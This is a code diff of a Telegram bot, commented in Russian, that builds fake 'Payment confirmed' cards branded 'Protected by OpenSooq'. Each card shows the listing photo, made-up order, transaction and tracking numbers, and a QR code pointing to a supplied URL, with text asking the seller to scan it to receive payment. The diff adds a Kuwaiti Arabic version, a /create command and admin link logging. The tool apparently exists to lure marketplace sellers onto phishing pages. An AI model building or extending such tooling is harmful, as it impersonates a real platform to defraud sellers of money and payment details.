@@ -37,9 +37,8 @@ QR_DOT_COLOR = "#64748B"
 WAITING_PRICE, WAITING_NAME = range(2)
 
 REGISTERED_USERS = {}
-RECENT_LINKS = []
+RECENT_LINKS = {}
 
-# Оставляем только английские переводы
 TRANSLATIONS = {
     "EN": {
         "payment_confirmed": "Payment confirmed", "payment_secure": "Your payment has been secured.",
@@ -51,6 +50,16 @@ TRANSLATIONS = {
         "help": "(i) Need help? Visit our Help Center or contact support.",
         "qr_text": "Send this QR code\nto the seller so they can\nreceive the payment.",
         "no_photo": "NO PHOTO", "price_not_avail": "Price not available"
+    },
+    "AR": {
+        "payment_confirmed": "تم الدفع بنجاح", "payment_secure": "مبلغك محفوظ بأمان.", "order": "طلب رقم #",
+        "processing": "جاري المعالجة", "transaction_id": "رقم العملية", "tracking_number": "رقم التتبع",
+        "delivery_status": "حالة التوصيل", "in_progress": "جاري التنفيذ", "waiting_seller": "بانتظار البائع\nلاستلام المبلغ",
+        "seller_confirmed": "تم تأكيد البائع", "preparing": "جاري التجهيز", "courier": "استلام المندوب",
+        "protected": "محمي بواسطة OpenSooq", "protected_text": "مبلغك آمن ومحمي لحين استلام طلبك.",
+        "help": "(i) تحتاج مساعدة؟ زر مركز المساعدة أو تواصل معنا.",
+        "qr_text": "أرسل رمز الـ QR\nللبائع عشان يقدر\nيستلم المبلغ.",
+        "no_photo": "لا توجد صورة", "price_not_avail": "السعر غير متوفر"
     }
 }
 
@@ -158,8 +167,8 @@ def generate_new_qr(data, size=230):
     draw_eye(0, 0); draw_eye(actual_size - box_size * 7, 0); draw_eye(0, actual_size - box_size * 7)
     return img
 
-def make_card(data):
-    t = TRANSLATIONS["EN"]
+def make_card(data, lang="EN"):
+    t = TRANSLATIONS[lang]
     W, H = 1000, 1450 
     image = Image.new("RGB", (W, H), BG_COLOR)
     draw = ImageDraw.Draw(image)
@@ -170,14 +179,14 @@ def make_card(data):
         draw.line((cx-5, cy+10, cx+15, cy-10), fill="white", width=6)
     draw.rounded_rectangle((40, 40, W-40, 160), radius=20, fill=LIGHT_GREEN)
     draw_check_icon(70, 65, 70, GREEN)
-    draw.text((160, 70), t["payment_confirmed"], font=font(36, True), fill=NAVY)
-    draw.text((160, 115), t["payment_secure"], font=font(24), fill=GRAY)
+    draw.text((160, 70), prepare_text(t["payment_confirmed"]), font=font(36, True), fill=NAVY)
+    draw.text((160, 115), prepare_text(t["payment_secure"]), font=font(24), fill=GRAY)
     draw.text((W-80, 90), ">", font=font(40, True), fill=GRAY)
     draw.rounded_rectangle((40, 190, W-40, 850), radius=20, fill="white", outline=BORDER, width=2)
-    draw.text((70, 220), t["order"], font=font(24), fill=GRAY)
+    draw.text((70, 220), prepare_text(t["order"]), font=font(24), fill=GRAY)
     draw.text((70, 250), data["order_id"], font=font(55, True), fill=NAVY)
     draw.rounded_rectangle((70, 320, 240, 365), radius=15, fill="#D1F2D8")
-    draw.text((95, 328), t["processing"], font=font(24, True), fill="#1E7D32")
+    draw.text((95, 328), prepare_text(t["processing"]), font=font(24, True), fill="#1E7D32")
     if data["image"]:
         img = ImageOps.fit(data["image"], (220, 220), Image.Resampling.LANCZOS)
         mask = Image.new("L", img.size, 0)
@@ -194,18 +203,18 @@ def make_card(data):
     draw.rounded_rectangle((630, 210, 930, 640), radius=20, fill="#F8FAFC", outline=BORDER, width=2)
     qr_img = generate_new_qr(data["url"], size=230) 
     image.paste(qr_img, (665, 240), qr_img) 
-    draw.multiline_text((780, 495), t["qr_text"], font=font(18), fill=GRAY, align="center", anchor="ma", spacing=4)
+    draw.multiline_text((780, 495), prepare_text(t["qr_text"]), font=font(18), fill=GRAY, align="center", anchor="ma", spacing=4)
     draw.line((70, 650, W-70, 650), fill=BORDER, width=2)
     draw.rounded_rectangle((70, 690, 120, 725), radius=5, outline=GRAY, width=4)
     draw.line((70, 700, 120, 700), fill=GRAY, width=4)
-    draw.text((140, 680), t["transaction_id"], font=font(22), fill=GRAY)
+    draw.text((140, 680), prepare_text(t["transaction_id"]), font=font(22), fill=GRAY)
     draw.text((140, 710), data["trans_id"], font=font(32, True), fill=NAVY)
     truck_x, truck_y = 530, 690
     draw.rectangle((truck_x, truck_y + 10, truck_x + 40, truck_y + 40), outline=GRAY, width=4)
     draw.polygon([(truck_x+40, truck_y+15), (truck_x+60, truck_y+25), (truck_x+60, truck_y+40), (truck_x+40, truck_y+40)], outline=GRAY, width=4)
     draw.ellipse((truck_x+5, truck_y+35, truck_x+15, truck_y+45), fill=GRAY)
     draw.ellipse((truck_x+45, truck_y+35, truck_x+55, truck_y+45), fill=GRAY)
-    draw.text((610, 680), t["tracking_number"], font=font(22), fill=GRAY)
+    draw.text((610, 680), prepare_text(t["tracking_number"]), font=font(22), fill=GRAY)
     draw.text((610, 710), data["track_id"], font=font(32, True), fill=NAVY)
     draw.rounded_rectangle((40, 880, W-40, 1130), radius=20, fill="white", outline=BORDER, width=2)
     truck_x, truck_y = 70, 910
@@ -213,9 +222,9 @@ def make_card(data):
     draw.polygon([(truck_x+40, truck_y+15), (truck_x+60, truck_y+25), (truck_x+60, truck_y+40), (truck_x+40, truck_y+40)], outline=NAVY, width=4)
     draw.ellipse((truck_x+5, truck_y+35, truck_x+15, truck_y+45), fill=NAVY)
     draw.ellipse((truck_x+45, truck_y+35, truck_x+55, truck_y+45), fill=NAVY)
-    draw.text((150, 910), t["delivery_status"], font=font(34, True), fill=NAVY)
+    draw.text((150, 910), prepare_text(t["delivery_status"]), font=font(34, True), fill=NAVY)
     draw.rounded_rectangle((750, 905, 930, 950), radius=15, fill="#D1F2D8")
-    draw.text((780, 915), t["in_progress"], font=font(22, True), fill="#1E7D32")
+    draw.text((780, 915), prepare_text(t["in_progress"]), font=font(22, True), fill="#1E7D32")
     line_y = 1010
     points = [100, 330, 560, 790]
     draw.line((points[0], line_y, points[-1], line_y), fill=BORDER, width=4)
@@ -226,17 +235,17 @@ def make_card(data):
             draw.ellipse((p-20, line_y-20, p+20, line_y+20), fill=GREEN)
             draw.line((p-8, line_y, p-2, line_y+8), fill="white", width=4)
             draw.line((p-2, line_y+8, p+10, line_y-8), fill="white", width=4)
-            draw.text((p-60, line_y+35), labels[i], font=font(18), fill=NAVY)
+            draw.text((p-60, line_y+35), prepare_text(labels[i]), font=font(18), fill=NAVY)
         else:
             draw.ellipse((p-20, line_y-20, p+20, line_y+20), fill="white", outline=BORDER, width=3)
-            draw.text((p-80, line_y+35), labels[i], font=font(18), fill=GRAY)
+            draw.text((p-80, line_y+35), prepare_text(labels[i]), font=font(18), fill=GRAY)
     draw.rounded_rectangle((40, 1160, W-40, 1280), radius=20, fill="white", outline=BORDER, width=2)
     draw_check_icon(70, 1185, 60, GREEN)
-    draw.text((150, 1185), t["protected"], font=font(30, True), fill=NAVY)
-    draw.text((150, 1225), t["protected_text"], font=font(20), fill=GRAY)
+    draw.text((150, 1185), prepare_text(t["protected"]), font=font(30, True), fill=NAVY)
+    draw.text((150, 1225), prepare_text(t["protected_text"]), font=font(20), fill=GRAY)
     draw.text((W-80, 1200), ">", font=font(40, True), fill=GRAY)
     draw.rounded_rectangle((40, 1310, W-40, 1390), radius=15, fill="#F0F4F8")
-    draw.text((70, 1335), t["help"], font=font(22), fill=GRAY)
+    draw.text((70, 1335), prepare_text(t["help"]), font=font(22), fill=GRAY)
     output = io.BytesIO()
     image.save(output, format="PNG")
     output.seek(0)
@@ -262,6 +271,7 @@ def unblock_user(user_id):
         return True
     return False
 
+# --- АДМИН КОМАНДЫ ---
 async def block_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID: return
     try:
@@ -293,7 +303,7 @@ async def links_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Ссылок пока не было.")
         return
     msg = "🔗 *Последние 10 ссылок:*\n\n"
-    for item in RECENT_LINKS[-10:]: msg += f"👤 @{item['user']}\n🔗 {item['url']}\n\n"
+    for item in list(RECENT_LINKS.values())[-10:]: msg += f"👤 @{item['user']}\n🔗 {item['url']}\n\n"
     await update.message.reply_text(msg, parse_mode="Markdown")
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -321,7 +331,9 @@ async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     username = REGISTERED_USERS.get(user_id, update.effective_user.username or f"ID_{user_id}")
     link_match = re.search(r'(https?://\S+)', text)
-    if link_match: RECENT_LINKS.append({"user": username, "url": link_match.group(1)})
+    if link_match: 
+        RECENT_LINKS[user_id] = {"user": username, "url": link_match.group(1)}
+        
     await update.message.reply_text("Ссылка получена. Ищу данные...")
     try:
         data = await asyncio.to_thread(get_listing, text)
@@ -348,10 +360,18 @@ async def get_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
     if text != "/skip": context.user_data["card_data"]["title"] = text
     data = context.user_data["card_data"]
+    
+    # Сохраняем данные в память пользователя для команды /create
+    context.user_data["last_card_data"] = data
+    
     if data["image"]:
-        await update.message.reply_text("Собираю карточку...")
-        card = await asyncio.to_thread(make_card, data)
-        await update.message.reply_photo(photo=card, caption="Готово!", read_timeout=60, write_timeout=60, connect_timeout=60)
+        await update.message.reply_text("Собираю карточку (English)...")
+        card = await asyncio.to_thread(make_card, data, "EN")
+        await update.message.reply_photo(
+            photo=card, 
+            caption="Готово! Чтобы сделать арабскую версию, напиши `/create arabic`", 
+            read_timeout=60, write_timeout=60, connect_timeout=60
+        )
         return ConversationHandler.END
     else:
         await update.message.reply_text("⚠️ Фото нет. Отправь картинку.")
@@ -362,16 +382,46 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.user_data.get("authorized"): return
     data = context.user_data.get("card_data")
     if not data: return
-    await update.message.reply_text("Фото получено! Собираю карточку...")
+    await update.message.reply_text("Фото получено! Собираю карточку (English)...")
     try:
         photo_file = await update.message.photo[-1].get_file()
         photo_bytes = await photo_file.download_as_bytearray()
         data["image"] = Image.open(io.BytesIO(photo_bytes)).convert("RGB")
-        card = await asyncio.to_thread(make_card, data)
-        await update.message.reply_photo(photo=card, caption="Готово!", read_timeout=60, write_timeout=60, connect_timeout=60)
+        
+        # Сохраняем данные в память
+        context.user_data["last_card_data"] = data
+        
+        card = await asyncio.to_thread(make_card, data, "EN")
+        await update.message.reply_photo(
+            photo=card, 
+            caption="Готово! Чтобы сделать арабскую версию, напиши `/create arabic`", 
+            read_timeout=60, write_timeout=60, connect_timeout=60
+        )
         context.user_data["card_data"] = None
     except Exception as e:
         await update.message.reply_text(f"ОШИБКА:\n{e}")
+
+# --- НОВАЯ КОМАНДА /create ---
+async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id in get_blocked_list(): return
+    
+    data = context.user_data.get("last_card_data")
+    if not data:
+        await update.message.reply_text("Нет данных для генерации. Сначала отправь ссылку и пройди все шаги.")
+        return
+    
+    lang = "EN"
+    if context.args and context.args[0].lower() in ["arabic", "ar", "kuwait"]:
+        lang = "AR"
+        await update.message.reply_text("Собираю карточку (Kuwaiti Arabic)...")
+    else:
+        await update.message.reply_text("Собираю карточку (English)...")
+        
+    try:
+        card = await asyncio.to_thread(make_card, data, lang)
+        await update.message.reply_photo(photo=card, caption="Готово!", read_timeout=60, write_timeout=60, connect_timeout=60)
+    except Exception as e:
+        await update.message.reply_text(f"❌ ОШИБКА ПРИ СОЗДАНИИ КАРТОЧКИ:\n\n{e}")
 
 async def run_bot():
     bot_app = Application.builder().token(TOKEN).build()
@@ -387,13 +437,15 @@ async def run_bot():
     bot_app.add_handler(CommandHandler("unblock", unblock_command))
     bot_app.add_handler(CommandHandler("users", users_command))
     bot_app.add_handler(CommandHandler("links", links_command))
+    bot_app.add_handler(CommandHandler("create", create_command)) # Добавили команду /create
     bot_app.add_handler(CommandHandler("start", start))
     bot_app.add_handler(conv_handler)
     bot_app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
+    
     await bot_app.initialize()
     await bot_app.start()
     await bot_app.updater.start_polling()
-    print("✅ БОТ ЗАПУЩЕН (Polling mode)")
+    print("✅ БОТ ЗАПУЩЕН (с командой /create)")
 
 if __name__ == "__main__":
     def start_bot_thread():
